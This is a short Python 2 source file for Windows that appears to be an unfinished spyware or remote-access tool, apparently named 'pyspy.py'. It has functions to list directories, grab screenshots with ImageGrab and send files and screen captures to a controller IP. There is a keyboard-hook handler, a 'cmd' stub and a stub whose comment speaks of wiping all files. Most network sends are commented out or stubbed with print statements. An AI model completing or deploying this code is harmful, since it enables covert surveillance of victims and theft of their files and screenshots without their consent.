# -*- coding:utf-8 -*-
import pyHook
import threading
import pythoncom
import os
import win32api
import win32con
import sys
import chardet
import time
from PIL import ImageGrab
IP=''
#这里需要开启两个端口，
# 一个负责发送信息， threadnewssocket
# 一个负责发送文件   threadfilesocket
def sendthread(IP,FILE):
    try:
        if  os.path.exists(FILE):
            with open(FILE, 'rb') as f:
                for data in f:
                    print(data)
                    #s.send(data)
                    pass #发送文件
            #s.send
    except Exception:
        #异常处理
        return
def sendfiletohost(IP,FILE):
    thread1 = threading.Thread(target=sendthread, args=(IP, FILE,))
    thread1.start()
def sendtohost(IP,INFO):
    print(INFO)
    pass
def getlocaldir():
    try:
        sendtohost(IP,os.getcwd())
    except Exception:
        pass
def getlocalfiledir():
    c=os.listdir(os.getcwd())
    info=''
    for i in c:
        filepath=(os.getcwd()+'\\'+i).decode('GB2312')
        if os.path.isfile(filepath):
            info+=(filepath)
            info+='  file'
            info+='\n'
        else:
            info+=(filepath)
            info+='  document'
            info+='\n'
    sendtohost(IP,info)
def getthetopfiledir():
    toppath=(os.path.dirname(os.path.dirname(__file__))).decode('gb2312')
    sendtohost(IP,toppath)
def getfile(path,name):
    FILE=path+'\\'+name
    sendfiletohost(IP,FILE)
def boomwenjian(path):
    #那就是强势的爆破所有文件233
    pass
def jietu():
    #
    im = ImageGrab.grab()
    name=os.getcwd()+"\\"+time.strftime("%H+%M+%S")+".jpg"
    im.save(name)
    sendfiletohost(IP,name)
def cmd():
	pass
def onKeyboardEvent(event):
    return True

#getlocalfiledir()
#getthetopfiledir()
#getfile(os.getcwd(),"pyspy.py")
jietu()